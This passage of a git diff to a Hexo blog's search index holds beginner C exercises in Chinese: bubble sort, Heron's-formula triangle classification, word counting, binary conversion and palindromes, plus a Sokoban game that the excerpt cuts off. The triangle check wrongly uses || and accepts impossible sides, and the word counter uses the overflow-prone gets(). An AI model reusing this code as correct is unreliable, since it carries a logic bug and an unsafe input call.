<span class="built_in">printf</span>(<span class="string">"冒泡法排序 降序：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>运行结果： </p>
-<p><img src="//czheisenberg.github.io/2019/08/27/三角形的类型和面积/333.jpg" alt></p>
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/07/17/冒泡法排序/7.png" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -811,36 +822,23 @@
       </tags>
   </entry>
   <entry>
-    <title>冒泡法排序</title>
-    <url>/2019/07/17/%E5%86%92%E6%B3%A1%E6%B3%95%E6%8E%92%E5%BA%8F/</url>
-    <content><![CDATA[<h1 id="冒泡法排序"><a href="#冒泡法排序" class="headerlink" title="冒泡法排序"></a>冒泡法排序</h1><p>冒泡法排序：  </p>
-<p>源代码：  </p>
+    <title>三角形的类型和面积</title>
+    <url>/2019/08/27/%E4%B8%89%E8%A7%92%E5%BD%A2%E7%9A%84%E7%B1%BB%E5%9E%8B%E5%92%8C%E9%9D%A2%E7%A7%AF/</url>
+    <content><![CDATA[<h1 id="计算三角形的类型和面积"><a href="#计算三角形的类型和面积" class="headerlink" title="计算三角形的类型和面积"></a>计算三角形的类型和面积</h1><h2 id="海伦公式："><a href="#海伦公式：" class="headerlink" title="海伦公式："></a>海伦公式：</h2><p>海伦公式，传说中是古代的叙拉古国王希伦二世发现的公式，利用三角形的三边来求三角形的面积，但后人求证出此公式其实是 <strong>阿基米德</strong>这个老头发现的！  （详细情况请自行百科：）  </p>
+<p>ps:中国宋代的数学家秦九韶在1247年独立提出了“三斜求积术” </p>
 <a id="more"></a>
 
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入%d个数：\n"</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=N<span class="number">-1</span>;j&gt;i;j--)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(a[j]&gt;a[j<span class="number">-1</span>])          <span class="comment">// &gt; 为降序，&lt; 为升序</span></span><br><span class="line">						&#123;</span><br><span class="line">							t=a[j],a[j]=a[j<span class="number">-1</span>],a[j<span class="number">-1</span>]=t;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"冒泡法排序 降序：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/07/17/冒泡法排序/7.png" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>十进制转二进制</title>
-    <url>/2019/07/16/%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6/</url>
-    <content><![CDATA[<h1 id="十进制转二进制"><a href="#十进制转二进制" class="headerlink" title="十进制转二进制"></a>十进制转二进制</h1><p>编写一个C程序实现进制转换：  </p>
-<p>10 to 2:</p>
+<p>一个三角形 三边分别为： a、b、c，s为面积  </p>
+<p><em>s=(a+b+c)/2</em>  </p>
+<p><em>s=根号{s(s-a)(s-b)(s-c)}</em> </p>
+<p>此公式就摆脱了 高与底  </p>
+<h2 id="include”math-h”"><a href="#include”math-h”" class="headerlink" title="#include”math.h”"></a>#include”math.h”</h2><p><strong>&lt;math.h&gt;</strong> 头文件包含了一系列与数学计算相关的函数和宏。  </p>
+<h2 id="sqrt-平方根计算"><a href="#sqrt-平方根计算" class="headerlink" title="sqrt(平方根计算)"></a>sqrt(平方根计算)</h2><p>sqrt 就是公式中的根号，用法： sqrt(xxxx)</p>
 <p>源代码：  </p>
-<a id="more"></a>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"math.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">float</span> a,b,c,area,s;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入三角形的三边长：\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%f%f%f"</span>,&amp;a,&amp;b,&amp;c);</span><br><span class="line">	<span class="keyword">if</span>(a+b&gt;c||a+c&gt;b||b+c&gt;a)<span class="comment">// 两边之和大于第三边 </span></span><br><span class="line">		&#123;</span><br><span class="line">			s=(a+b+c)/<span class="number">2</span>;</span><br><span class="line">			area=(<span class="keyword">float</span>)<span class="built_in">sqrt</span>(s*(s-a)*(s-b)*(s-c));<span class="comment">//海伦公式 </span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"三角形的面积：%f\n"</span>,area);</span><br><span class="line">			<span class="keyword">if</span>(a==b&amp;&amp;a==c)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"此为：等边三角形！\n"</span>);	<span class="comment">//判断等边 </span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(a==b||a==c||b==c)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"此为：等腰三角形！\n"</span>);<span class="comment">//判断等腰 </span></span><br><span class="line">				 <span class="keyword">else</span> <span class="keyword">if</span>(a*a+b*b==c*c||a*a+c*c==b*b||b*b+c*c==a*a) <span class="comment">//判断直角 </span></span><br><span class="line">			 			<span class="built_in">printf</span>(<span class="string">"此为：直角三角形！\n"</span>);</span><br><span class="line">					  <span class="keyword">else</span>	</span><br><span class="line">					  	<span class="built_in">printf</span>(<span class="string">"此为：普通三角形！\n"</span>);<span class="comment">//其他普通三角形 </span></span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"不能构成三角形！\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stoe</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,e=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">long</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(number)</span><br><span class="line">	&#123;</span><br><span class="line">		sum+=number%<span class="number">2</span>*e;</span><br><span class="line">		number/=<span class="number">2</span>;</span><br><span class="line">		e*=<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">long</span> y=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一个整数："</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">	y=stoe(x);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"十进制：%d\n二进制%ld\n"</span>,x,y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/07/16/十进制转二进制/3.png" alt></p>
+<p>运行结果： </p>
+<p><img src="//czheisenberg.github.io/2019/08/27/三角形的类型和面积/333.jpg" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -861,6 +859,45 @@
 
 <p>运行结果：  </p>
 <p><img src="//czheisenberg.github.io/2019/07/16/十进制转二进制数组/4.png" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>单词个数</title>
+    <url>/2019/07/19/%E5%8D%95%E8%AF%8D%E4%B8%AA%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="单词个数"><a href="#单词个数" class="headerlink" title="单词个数"></a>单词个数</h1><p>编写一个程序记录这行一共有多少个单词！  </p>
+<p>源代码：  </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> ch[N];</span><br><span class="line">	<span class="keyword">int</span> i,sum=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一句话：\n"</span>);</span><br><span class="line">	gets(ch);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;ch[i]!=<span class="string">'\0'</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(ch[i]!=<span class="string">' '</span>&amp;&amp;(ch[i+<span class="number">1</span>]==<span class="string">' '</span>||ch[i+<span class="number">1</span>]==<span class="string">'\0'</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					sum++;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"一共有 %d 个单词！\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/07/19/单词个数/1.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>十进制转二进制</title>
+    <url>/2019/07/16/%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6/</url>
+    <content><![CDATA[<h1 id="十进制转二进制"><a href="#十进制转二进制" class="headerlink" title="十进制转二进制"></a>十进制转二进制</h1><p>编写一个C程序实现进制转换：  </p>
+<p>10 to 2:</p>
+<p>源代码：  </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stoe</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,e=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">long</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(number)</span><br><span class="line">	&#123;</span><br><span class="line">		sum+=number%<span class="number">2</span>*e;</span><br><span class="line">		number/=<span class="number">2</span>;</span><br><span class="line">		e*=<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">long</span> y=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一个整数："</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">	y=stoe(x);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"十进制：%d\n二进制%ld\n"</span>,x,y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/07/16/十进制转二进制/3.png" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -912,46 +949,6 @@
       </tags>
   </entry>
   <entry>
-    <title>单词个数</title>
-    <url>/2019/07/19/%E5%8D%95%E8%AF%8D%E4%B8%AA%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="单词个数"><a href="#单词个数" class="headerlink" title="单词个数"></a>单词个数</h1><p>编写一个程序记录这行一共有多少个单词！  </p>
-<p>源代码：  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> ch[N];</span><br><span class="line">	<span class="keyword">int</span> i,sum=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一句话：\n"</span>);</span><br><span class="line">	gets(ch);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;ch[i]!=<span class="string">'\0'</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(ch[i]!=<span class="string">' '</span>&amp;&amp;(ch[i+<span class="number">1</span>]==<span class="string">' '</span>||ch[i+<span class="number">1</span>]==<span class="string">'\0'</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					sum++;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"一共有 %d 个单词！\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/07/19/单词个数/1.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>回文数</title>
-    <url>/2019/07/16/%E5%9B%9E%E6%96%87%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h1><p>“回文”是指正读反读都能读通的句子，它是古今中外都有的一种修辞方式和文字游戏，如“我为人人，人人为我”等。在数学中也有这样一类数字有这样的特征，成为回文数（palindrome number</p>
-<p>设n是一任意自然数。若将n的各位数字反向排列所得自然数n1与n相等，则称n为一回文数。例如，若n=1234321，则称n为一回文数；但若n=1234567，则n不是回文数。  </p>
-<p>简单来说： 正读与反读都一样！  </p>
-<p>源代码：  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">h_h</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,m;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;x;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			j=i;</span><br><span class="line">			m=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span>(j)</span><br><span class="line">				&#123;</span><br><span class="line">					m=m*<span class="number">10</span>+j%<span class="number">10</span>;</span><br><span class="line">					j/=<span class="number">10</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">if</span>(i==m)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d "</span>,i);</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x,y,i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一个范围 如：100\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">	<span class="keyword">if</span>(h_h(x));</span><br><span class="line">		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/07/16/回文数/6.png" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>图形</title>
     <url>/2019/08/17/%E5%9B%BE%E5%BD%A2/</url>
     <content><![CDATA[]]></content>
@@ -983,6 +980,27 @@
       </tags>
   </entry>
   <entry>
+    <title>回文数</title>
+    <url>/2019/07/16/%E5%9B%9E%E6%96%87%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h1><p>“回文”是指正读反读都能读通的句子，它是古今中外都有的一种修辞方式和文字游戏，如“我为人人，人人为我”等。在数学中也有这样一类数字有这样的特征，成为回文数（palindrome number</p>
+<p>设n是一任意自然数。若将n的各位数字反向排列所得自然数n1与n相等，则称n为一回文数。例如，若n=1234321，则称n为一回文数；但若n=1234567，则n不是回文数。  </p>
+<p>简单来说： 正读与反读都一样！  </p>
+<p>源代码：  </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">h_h</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,m;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;x;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			j=i;</span><br><span class="line">			m=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span>(j)</span><br><span class="line">				&#123;</span><br><span class="line">					m=m*<span class="number">10</span>+j%<span class="number">10</span>;</span><br><span class="line">					j/=<span class="number">10</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">if</span>(i==m)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d "</span>,i);</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x,y,i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一个范围 如：100\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">	<span class="keyword">if</span>(h_h(x));</span><br><span class="line">		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/07/16/回文数/6.png" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>字母各个个数</title>
     <url>/2019/09/11/%E5%AD%97%E6%AF%8D%E5%90%84%E4%B8%AA%E4%B8%AA%E6%95%B0/</url>
     <content><![CDATA[<h1 id="输入一串字符统计里面各个大写字母的个数"><a href="#输入一串字符统计里面各个大写字母的个数" class="headerlink" title="输入一串字符统计里面各个大写字母的个数"></a>输入一串字符统计里面各个大写字母的个数</h1><p><em>（其它字符同理）</em></p>
@@ -1000,46 +1018,6 @@
       </categories>
       <tags>
         <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>推箱子</title>
-    <url>/2020/04/17/%E6%8E%A8%E7%AE%B1%E5%AD%90/</url>
-    <content><![CDATA[<h1 id="推箱子单关卡"><a href="#推箱子单关卡" class="headerlink" title="推箱子单关卡"></a>推箱子单关卡</h1><p>初次使用二维数组并编写经典小游戏：推箱子！（单关卡）</p>
-<p>注：查阅过百度，烦请喷哥留德。  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> L 8</span></span><br><span class="line"><span class="keyword">int</span> x,y; <span class="comment">// 全局变量存储人的坐标 </span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[H][L]=</span><br><span class="line">&#123;</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">	&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>&#125;,</span><br><span class="line">	&#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">	&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125; 	<span class="comment">//0 空地,1墙，2人，3箱子，4目的地，7达到目的地  一个隐藏的6也是表示人，只不过这人站在目的地上面。 </span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw_map</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x_y</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		system(<span class="string">"cls"</span>);</span><br><span class="line">		draw_map();</span><br><span class="line">		<span class="built_in">move</span>();	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出图形 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw_map</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;H;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;L;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">switch</span>(<span class="built_in">map</span>[i][j])	<span class="comment">// 0=空地，1=墙，2=人，3=箱子，4=目的地； </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">printf</span>(<span class="string">"--"</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">printf</span>(<span class="string">"■"</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">printf</span>(<span class="string">"♀"</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">printf</span>(<span class="string">"◆"</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">4</span>:<span class="built_in">printf</span>(<span class="string">"¤"</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">6</span>:<span class="built_in">printf</span>(<span class="string">"♂"</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">7</span>:<span class="built_in">printf</span>(<span class="string">"★"</span>);<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 移动 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	x_y();</span><br><span class="line">	boxs_num() ;</span><br><span class="line">	<span class="keyword">char</span> WASD;</span><br><span class="line">	WASD =_getch();</span><br><span class="line">	<span class="keyword">switch</span>(WASD)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 上 </span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">'W'</span>:<span class="keyword">case</span> <span class="string">'w'</span>:<span class="keyword">case</span> <span class="number">72</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">4</span>)	<span class="comment">// 人的前面位置为 空白 或者 人的前面值目的地 </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x<span class="number">-1</span>][y] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 空地,1墙，2人，3箱子，4目的地，7达到目的地  一个隐藏的6也是表示人，只不过这人站在目的地上面。</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">3</span> || <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x<span class="number">-2</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x<span class="number">-2</span>][y] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x<span class="number">-1</span>][y] -=<span class="number">1</span>; <span class="comment">// 箱子变人</span></span><br><span class="line">					<span class="built_in">map</span>[x<span class="number">-2</span>][y] +=<span class="number">3</span>; <span class="comment">// 箱子前面 的空地变成 箱子  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 下</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">'S'</span>:<span class="keyword">case</span> <span class="string">'s'</span>:<span class="keyword">case</span> <span class="number">80</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x+<span 